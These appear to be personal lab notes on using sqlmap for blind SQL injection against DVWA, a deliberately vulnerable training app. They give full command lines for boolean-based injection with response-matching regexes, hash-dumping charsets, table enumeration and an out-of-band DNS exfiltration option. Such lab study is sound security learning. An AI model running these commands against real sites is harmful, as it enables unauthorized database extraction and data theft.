# SQLMap

Search Tag(s): #blind-sql-injection #sqlmap #dvwa

## Boolean-Based

## Time-Based

--time-sec=10

### Enumeration

--first=FIRSTCHAR   First query output word character to retrieve  
--last=LASTCHAR     Last query output word character to retrieve

### Page comparison

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" -p id --random-agent --dbms=mysql --technique=B --string="User ID exists in the database." --not-string="User ID is MISSING from the database." --code=200
```

- We can combine the two flags (`--string` and `--not-string`) into one using the `--regexp` flag. We'll take the response `(?!is MISSING from)` to negate the match regex and match `(exists in)` positively.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" -p id --random-agent --dbms=mysql --technique=B --regexp="User ID ((exists in)|(?\!is MISSING from)) the database." --code=200
```

These are the python regexes that works so far.

```
User ID ((exists in)|(?!is MISSING from)) the database.
User ID (?!is MISSING from)exists in the database.
User ID exists in(?!is MISSING from the database.
User ID (?!is MISSING from)[a-zA-Z ]*the database.
User ID (?!is MISSING from)[a-zA-Z ]+the database.
User ID (?!is MISSING from)[a-zA-Z ]{9} the database.
User ID (?!is MISSING from)[a-zA-Z ]{10}the database.
```

--smart             Perform thorough tests only if positive heuristic(s)
--text-only         Compare pages based only on the textual content
--titles            Compare pages based only on their titles

### Bruteforce

For dumping hashes

```
--charset="1234567890abcdef"
```

```
--charset="1234567890ABCDEF"
```

```
--charset="1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
```

### Frequency Analysis

Brute force:
These options can be used to run brute force checks

--common-tables     Check existence of common tables

uses `sqlmap/data/txt/common-tables.txt`

--common-columns    Check existence of common columns

uses `sqlmap/data/txt/common-columns.txt`

--common-files      Check existence of common files

uses `sqlmap/data/txt/common-files.txt`

--safe-url=SAFEURL  URL address to visit frequently during testing
--safe-freq=SAFE..  Regular requests between visits to a safe URL


### Speed

Optimization:
These options can be used to optimize the performance of sqlmap

-o                  Turn on all optimization switches

--predict-output    Predict common queries output

uses `sqlmap/data/txt/common-outputs.txt`

--keep-alive        Use persistent HTTP(s) connections
--null-connection   Retrieve page length without actual HTTP response body
--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

### DNS Exfiltration (Out-of-band SQL Injection)

TODO: Demonstrate DNS exfiltration via sqlmap in blind SQLi

```
$ sudo sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dns-domain=<dns_server_IP> -D dvwa
```